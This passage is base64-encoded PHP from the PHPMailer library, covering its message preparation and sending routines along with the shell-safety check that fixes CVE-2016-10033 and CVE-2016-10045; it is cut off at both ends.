wb3MpOwogICAgICAgICAgICAvLyBWZXJpZnkgQ2hhclNldCBzdHJpbmcgaXMgYSB2YWxpZCBvbmUsIGFuZCBkb21haW4gcHJvcGVybHkgZW5jb2RlZCBpbiB0aGlzIENoYXJTZXQuCiAgICAgICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKCRkb21haW4pIGFuZCBAbWJfY2hlY2tfZW5jb2RpbmcoJGRvbWFpbiwgJHRoaXMtPkNoYXJTZXQpKSB7CiAgICAgICAgICAgICAgICAkZG9tYWluID0gbWJfY29udmVydF9lbmNvZGluZygkZG9tYWluLCAnVVRGLTgnLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgICAgICAgICBpZiAoKCRwdW55Y29kZSA9IGRlZmluZWQoJ0lOVExfSUROQV9WQVJJQU5UX1VUUzQ2JykgPwogICAgICAgICAgICAgICAgICAgIGlkbl90b19hc2NpaSgkZG9tYWluLCAwLCBJTlRMX0lETkFfVkFSSUFOVF9VVFM0NikgOgogICAgICAgICAgICAgICAgICAgIGlkbl90b19hc2NpaSgkZG9tYWluKSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHN1YnN0cigkYWRkcmVzcywgMCwgJHBvcykgLiAkcHVueWNvZGU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRhZGRyZXNzOwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBhbmQgc2VuZCBpdC4KICAgICAqIFVzZXMgdGhlIHNlbmRpbmcgbWV0aG9kIHNwZWNpZmllZCBieSAkTWFpbGVyLgogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbiBmYWxzZSBvbiBlcnJvciAtIFNlZSB0aGUgRXJyb3JJbmZvIHByb3BlcnR5IGZvciBkZXRhaWxzIG9mIHRoZSBlcnJvci4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNlbmQoKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICghJHRoaXMtPnByZVNlbmQoKSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cG9zdFNlbmQoKTsKICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciA9ICcnOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBQcmVwYXJlIGEgbWVzc2FnZSBmb3Igc2VuZGluZy4KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHByZVNlbmQoKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICR0aGlzLT5lcnJvcl9jb3VudCA9IDA7IC8vIFJlc2V0IGVycm9ycwogICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciA9ICcnOwoKICAgICAgICAgICAgLy8gRGVxdWV1ZSByZWNpcGllbnQgYW5kIFJlcGx5LVRvIGFkZHJlc3NlcyB3aXRoIElETgogICAgICAgICAgICBmb3JlYWNoIChhcnJheV9tZXJnZSgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlLCAkdGhpcy0+UmVwbHlUb1F1ZXVlKSBhcyAkcGFyYW1zKSB7CiAgICAgICAgICAgICAgICAkcGFyYW1zWzFdID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCRwYXJhbXNbMV0pOwogICAgICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJHRoaXMsICdhZGRBbkFkZHJlc3MnKSwgJHBhcmFtcyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpKSA8IDEpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3Byb3ZpZGVfYWRkcmVzcycpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gVmFsaWRhdGUgRnJvbSwgU2VuZGVyLCBhbmQgQ29uZmlybVJlYWRpbmdUbyBhZGRyZXNzZXMKICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXkoJ0Zyb20nLCAnU2VuZGVyJywgJ0NvbmZpcm1SZWFkaW5nVG8nKSBhcyAkYWRkcmVzc19raW5kKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9IHRyaW0oJHRoaXMtPiRhZGRyZXNzX2tpbmQpOwogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT4kYWRkcmVzc19raW5kKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPiRhZGRyZXNzX2tpbmQgPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpOwogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gJyAocHVueUVuY29kZSkgJyAuICR0aGlzLT4kYWRkcmVzc19raW5kOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIFNldCB3aGV0aGVyIHRoZSBtZXNzYWdlIGlzIG11bHRpcGFydC9hbHRlcm5hdGl2ZQogICAgICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmUnOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkdGhpcy0+c2V0TWVzc2FnZVR5cGUoKTsKICAgICAgICAgICAgLy8gUmVmdXNlIHRvIHNlbmQgYW4gZW1wdHkgbWVzc2FnZSB1bmxlc3Mgd2UgYXJlIHNwZWNpZmljYWxseSBhbGxvd2luZyBpdAogICAgICAgICAgICBpZiAoISR0aGlzLT5BbGxvd0VtcHR5IGFuZCBlbXB0eSgkdGhpcy0+Qm9keSkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIENyZWF0ZSBib2R5IGJlZm9yZSBoZWFkZXJzIGluIGNhc2UgYm9keSBtYWtlcyBjaGFuZ2VzIHRvIGhlYWRlcnMgKGUuZy4gYWx0ZXJpbmcgdHJhbnNmZXIgZW5jb2RpbmcpCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gJyc7CiAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keSA9ICR0aGlzLT5jcmVhdGVCb2R5KCk7CiAgICAgICAgICAgIC8vIGNyZWF0ZUJvZHkgbWF5IGhhdmUgYWRkZWQgc29tZSBoZWFkZXJzLCBzbyByZXRhaW4gdGhlbQogICAgICAgICAgICAkdGVtcGhlYWRlcnMgPSAkdGhpcy0+TUlNRUhlYWRlcjsKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAkdGhpcy0+Y3JlYXRlSGVhZGVyKCk7CiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICR0ZW1waGVhZGVyczsKCiAgICAgICAgICAgIC8vIFRvIGNhcHR1cmUgdGhlIGNvbXBsZXRlIG1lc3NhZ2Ugd2hlbiB1c2luZyBtYWlsKCksIGNyZWF0ZQogICAgICAgICAgICAvLyBhbiBleHRyYSBoZWFkZXIgbGlzdCB3aGljaCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4KICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ21haWwnKSB7CiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgKICAgICAgICAgICAgICAgICAgICAnU3ViamVjdCcsCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKHRyaW0oJHRoaXMtPlN1YmplY3QpKSkKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIFNpZ24gd2l0aCBES0lNIGlmIGVuYWJsZWQKICAgICAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+REtJTV9kb21haW4pCiAgICAgICAgICAgICAgICBhbmQgIWVtcHR5KCR0aGlzLT5ES0lNX3NlbGVjdG9yKQogICAgICAgICAgICAgICAgYW5kICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgb3IgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlKQogICAgICAgICAgICAgICAgICAgICAgICBhbmQgc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBmaWxlX2V4aXN0cygkdGhpcy0+REtJTV9wcml2YXRlKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAkaGVhZGVyX2RraW0gPSAkdGhpcy0+REtJTV9BZGQoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUJvZHkKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9IHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyLCAiXHJcbiAiKSAuIHNlbGY6OkNSTEYgLgogICAgICAgICAgICAgICAgICAgIHN0cl9yZXBsYWNlKCJcclxuIiwgIlxuIiwgJGhlYWRlcl9ka2ltKSAuIHNlbGY6OkNSTEY7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQWN0dWFsbHkgc2VuZCBhIG1lc3NhZ2UuCiAgICAgKiBTZW5kIHRoZSBlbWFpbCB2aWEgdGhlIHNlbGVjdGVkIG1lY2hhbmlzbQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcG9zdFNlbmQoKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIC8vIENob29zZSB0aGUgbWFpbGVyIGFuZCBzZW5kIHRocm91Z2ggaXQKICAgICAgICAgICAgc3dpdGNoICgkdGhpcy0+TWFpbGVyKSB7CiAgICAgICAgICAgICAgICBjYXNlICdzZW5kbWFpbCc6CiAgICAgICAgICAgICAgICBjYXNlICdxbWFpbCc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kbWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBjYXNlICdzbXRwJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHBTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgY2FzZSAnbWFpbCc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgJHNlbmRNZXRob2QgPSAkdGhpcy0+TWFpbGVyLidTZW5kJzsKICAgICAgICAgICAgICAgICAgICBpZiAobWV0aG9kX2V4aXN0cygkdGhpcywgJHNlbmRNZXRob2QpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+JHNlbmRNZXRob2QoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB1c2luZyB0aGUgJFNlbmRtYWlsIHByb2dyYW0uCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBUaGUgbWVzc2FnZSBib2R5CiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JFNlbmRtYWlsCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZG1haWxTZW5kKCRoZWFkZXIsICRib2R5KQogICAgewogICAgICAgIC8vIENWRS0yMDE2LTEwMDMzLCBDVkUtMjAxNi0xMDA0NTogRG9uJ3QgcGFzcyAtZiBpZiBjaGFyYWN0ZXJzIHdpbGwgYmUgZXNjYXBlZC4KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCBzZWxmOjppc1NoZWxsU2FmZSgkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAncW1haWwnKSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLWYlcyc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLW9pIC1mJXMgLXQnOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLXQnOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBUT0RPOiBJZiBwb3NzaWJsZSwgdGhpcyBzaG91bGQgYmUgY2hhbmdlZCB0byBlc2NhcGVzaGVsbGFyZy4gIE5lZWRzIHRob3JvdWdoIHRlc3RpbmcuCiAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50Zigkc2VuZG1haWxGbXQsIGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCksICR0aGlzLT5TZW5kZXIpOwoKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT5TaW5nbGVUb0FycmF5IGFzICR0b0FkZHIpIHsKICAgICAgICAgICAgICAgIGlmICghQCRtYWlsID0gcG9wZW4oJHNlbmRtYWlsLCAndycpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAnVG86ICcgLiAkdG9BZGRyIC4gIlxuIik7CiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOwogICAgICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygKICAgICAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwKICAgICAgICAgICAgICAgICAgICBhcnJheSgkdG9BZGRyKSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y2MsCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJjYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICAgICAkYm9keSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0ICE9IDApIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZnB1dHMoJG1haWwsICRoZWFkZXIpOwogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOwogICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwKICAgICAgICAgICAgICAgICR0aGlzLT50bywKICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsCiAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgJHRoaXMtPkZyb20KICAgICAgICAgICAgKTsKICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gMCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEZpeCBDVkUtMjAxNi0xMDAzMyBhbmQgQ1ZFLTIwMTYtMTAwNDUgYnkgZGlzYWxsb3dpbmcgcG90ZW50aWFsbHkgdW5zYWZlIHNoZWxsIGNoYXJhY3RlcnMuCiAgICAgKgogICAgICogTm90ZSB0aGF0IGVzY2FwZXNoZWxsYXJnIGFuZCBlc2NhcGVzaGVsbGNtZCBhcmUgaW5hZGVxdWF0ZSBmb3Igb3VyIHB1cnBvc2VzLCBlc3BlY2lhbGx5IG9uIFdpbmRvd3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIHN0cmluZyB0byBiZSB2YWxpZGF0ZWQKICAgICAqIEBzZWUgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvaXNzdWVzLzkyNCBDVkUtMjAxNi0xMDA0NSBidWcgcmVwb3J0CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gaXNTaGVsbFNhZmUoJHN0cmluZykKICAgIHsKICAgICAgICAvLyBGdXR1cmUtcHJvb2YKICAgICAgICBpZiAoZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcKICAgICAgICAgICAgb3IgIWluX2FycmF5KGVzY2FwZXNoZWxsYXJnKCRzdHJpbmcpLCBhcnJheSgiJyRzdHJpbmcnIiwgIlwiJHN0cmluZ1wiIikpCiAgICAgICAgKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJHN0cmluZyk7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAgICAgJGMgPSAkc3RyaW5nWyRpXTsKCiAgICAgICAgICAgIC8vIEFsbCBvdGhlciBjaGFyYWN0ZXJzIGhhdmUgYSBzcGVjaWFsIG1lYW5pbmcgaW4gYXQgbGVhc3Qgb25lIGNvbW1vbiBzaGVsbCwgaW5jbHVkaW5nID0gYW5kICsuCiAgICAgICAgICAgIC8vIEZ1bGwgc3RvcCAoLikgaGFzIGEgc3BlY2lhbCBtZWFuaW5nIGluIGNtZC5leGUsIGJ1dCBpdHMgaW1wYWN0IHNob3VsZCBiZSBuZWdsaWdpYmxlIGhlcmUuCiAgICAgICAgICAgIC8vIE5vdGUgdGhhdCB0aGlzIGRvZXMgcGVybWl0IG5vbi1MYXRpbiBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyBiYXNlZCBvbiB0aGUgY3VycmVudCBsb2NhbGUuCiAgICAgICAgICAgIGlmICghY3R5cGVfYWxudW0oJGMpICYmIHN0cnBvcygnQF8tLicsICRjKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayB3aGV0aGVyIGEgZmlsZSBwYXRoIGlzIG9mIGEgcGVybWl0dGVkIHR5cGUuCiAgICAgKiBVc2VkIHRvIHJlamVjdCBVUkxzIGFuZCBwaGFyIGZpbGVzIGZyb20gZnVuY3Rpb25zIHRoYXQgYWNjZXNzIGxvY2FsIGZpbGUgcGF0aHMsCiAgICAgKiBzdWNoIGFzIGFkZEF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgcmVsYXRpdmUgb3IgYWJzb2x1dGUgcGF0aCB0byBhIGZpbGUuCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1Blcm1pdHRlZFBhdGgoJHBhdGgpCiAgICB7CiAgICAgICAgcmV0dXJuICFwcmVnX21hdGNoKCcjXlthLXpdKzovLyNpJywgJHBhdGgpOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSBQSFAgbWFpbCgpIGZ1bmN0aW9uLgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9ib29rLm1haWwucGhwCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJHRvQXJyID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgewogICAgICAgICAgICAkdG9BcnJbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOwogICAgICAgIH0KICAgICAgICAkdG8gPSBpbXBsb2RlKCcsICcsICR0b0Fycik7CgogICAgICAgICRwYXJhbXMgPSBudWxsOwogICAgICAgIC8vVGhpcyBzZXRzIHRoZSBTTVRQIGVudmVsb3BlIHNlbmRlciB3aGljaCBnZXRzIHR1cm5lZCBpbnRvIGEgcmV0dXJuLXBhdGggaGVhZGVyIGJ5IHRoZSByZWNlaXZlcgogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgogICAgICAgICAgICBpZiAoc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgIWluaV9nZXQoJ3NhZmVfbW9kZScpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsKICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR0aGlzLT5TZW5kZXIpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0ID0gZmFsc2U7CiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbyBhbmQgY291bnQoJHRvQXJyKSA+IDEpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHR